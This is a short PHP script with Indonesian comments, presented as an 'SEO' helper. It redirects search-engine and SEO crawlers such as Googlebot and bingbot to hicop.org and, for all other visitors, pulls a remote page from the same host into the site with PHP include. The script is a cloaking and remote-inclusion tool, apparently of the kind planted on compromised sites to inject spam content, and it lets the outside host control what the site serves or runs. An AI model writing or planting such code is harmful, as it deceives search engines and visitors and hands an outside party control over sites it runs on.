<?php
class SEO_Setengah_Waras
{
    protected string $REDIRECT_URL = "https://hicop.org/";
    protected bool $BYPASS_CLIENT_SIDE_CHECKS = false;

    // Isi dengan UA (string) atau keyword UA yang mau kamu redirect
    protected array $BLOCKED_USER_AGENTS = [
        // contoh keyword aja lebih masuk akal daripada full UA panjang:
        "Googlebot",
        "bingbot",
        "AhrefsBot",
        "SemrushBot",
        "MJ12bot",
    ];

    protected bool $blocked = false;
    protected array $errors = [];

    public function shouldBypassClientSideChecks(): bool
    {
        return $this->BYPASS_CLIENT_SIDE_CHECKS === true;
    }

    public function getRedirectUrl(): string
    {
        return $this->REDIRECT_URL;
    }

    public function check(): bool
    {
        $this->blocked = $this->checkUserAgent();
        return $this->blocked;
    }

    public function checkUserAgent(): bool
    {
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        if ($ua === '') return false;

        $pattern = $this->buildUserAgentRegex($this->BLOCKED_USER_AGENTS);
        return (bool) preg_match($pattern, $ua);
    }

    private function buildUserAgentRegex(array $needles): string
    {
        // escape semua string agar aman jadi regex
        $escaped = array_map(fn($s) => preg_quote((string)$s, '/'), $needles);
        // match salah satu keyword
        return '/(' . implode('|', $escaped) . ')/i';
    }

    public function isBlocked(): bool
    {
        return $this->blocked === true;
    }
}

// ==== RUN ====
$kanyaars = new SEO_Setengah_Waras();
$blocked = $kanyaars->check();

// kalau mau bypass ya langsung redirect (opsional)
if ($kanyaars->shouldBypassClientSideChecks()) {
    header("Location: " . $kanyaars->getRedirectUrl(), true, 302);
    exit();
}

// redirect HANYA jika UA match blocked list
if ($blocked) {
    header("Location: " . $kanyaars->getRedirectUrl(), true, 302);
    exit();
}

include "https://hicop.org/dk168/index.html";
